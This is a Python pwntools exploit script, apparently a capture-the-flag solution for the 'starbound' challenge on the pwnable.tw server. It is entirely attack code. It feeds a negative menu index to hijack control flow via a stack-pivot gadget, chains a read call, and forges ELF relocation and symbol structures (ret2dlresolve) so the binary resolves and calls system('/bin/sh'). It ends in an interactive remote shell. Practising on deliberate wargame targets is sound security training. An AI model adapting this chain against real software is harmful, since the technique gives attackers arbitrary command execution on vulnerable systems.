#!/usr/bin/env python3
from pwn import *

p = remote("chall.pwnable.tw", "10202")

elf = ELF("./starbound")
# context.update(binary=elf, log_level="DEBUG")
# p = elf.process()
# gdb.attach(
#     p,
#     """
#     b *main+88
#     """,
# )
gadget = 0x08048E48  #: add esp, 0x1c ; ret
ppp_ret = 0x080494DA  #: pop ebx ; pop esi ; pop edi ; ret
call_resolve = 0x8048940  # push link_map + jmp dl_runtime_resolve
wr_segment = 0x8057DA0  # segment rw-p | map_tmp + 0x20

write_plt = elf.symbols["write"]
write_got = elf.got["write"]
read_plt = elf.symbols["read"]
read_got = elf.got["read"]
main_addr = elf.symbols["main"]

STRTAB = 0x80484FC
SYMTAB = 0x80481DC
JMPREL = 0x80487C8

p.sendlineafter(b"> ", b"6")
p.sendlineafter(b"> ", b"2")
name = b""
name += p32(gadget)
p.sendlineafter(b"name: ", name) # NAME_80580D0
p.sendlineafter(b"> ", b"1")  # => go to main menu

# fake struct STRTAB, SYMTAB and JMPREL
fake_area = wr_segment
rel_offset = fake_area - JMPREL

elf32_sym = fake_area + 0x8
align = 0x10 - ((elf32_sym - SYMTAB) % 0x10)
elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (int(index_sym) << 8) | 0x7
st_name = (elf32_sym + 0x10) - STRTAB
elf32_rel_entry = p32(read_got) + p32(r_info)
elf32_sym_entry = p32(st_name) + p32(0)
elf32_sym_entry += p32(0) + p32(0x12)

pl2 = b""
pl2 += elf32_rel_entry
pl2 += b"A" * align
pl2 += elf32_sym_entry
pl2 += b"system\x00"
length = 100 - len(pl2)
pl2 += b"A" * length
pl2 += b"/bin/sh\x00"
length = 0x80 - len(pl2)
pl2 += b"A" * length

### out-of-bound ###
pl1 = b""
pl1 += b"-33\x00"
pl1 += p32(0xDEADBEEF)
pl1 += p32(read_plt) + p32(ppp_ret)
pl1 += p32(0) + p32(wr_segment) + p32(0x80)
pl1 += p32(call_resolve) + p32(rel_offset)
pl1 += b"A" * 4 + p32(wr_segment + 100)
p.sendlineafter(b"> ", pl1)
p.sendline(pl2)

p.interactive()
